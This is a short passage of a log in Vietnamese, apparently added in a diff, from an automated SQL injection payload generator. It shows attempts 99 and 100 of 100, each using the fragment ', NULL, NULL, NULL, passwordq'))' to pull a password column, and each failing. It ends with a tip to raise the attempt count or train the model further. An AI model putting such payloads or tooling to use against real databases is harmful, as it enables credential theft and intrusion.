+2025-11-24 10:33:42,086 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:42,088 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:42,088 - 
+--- Lần thử 100/100 ---
+2025-11-24 10:33:42,266 -   Payload cuối: ", NULL, NULL, NULL, passwordq'))"
+2025-11-24 10:33:42,267 -   Kết quả: Thất bại. Đang thử lại...
+2025-11-24 10:33:42,268 - 
+--- Đã hết 100 lần thử. Không tìm thấy payload thành công. ---
+2025-11-24 10:33:42,272 - Mẹo: Hãy thử tăng '--attempts', hoặc huấn luyện (main.py) thêm.
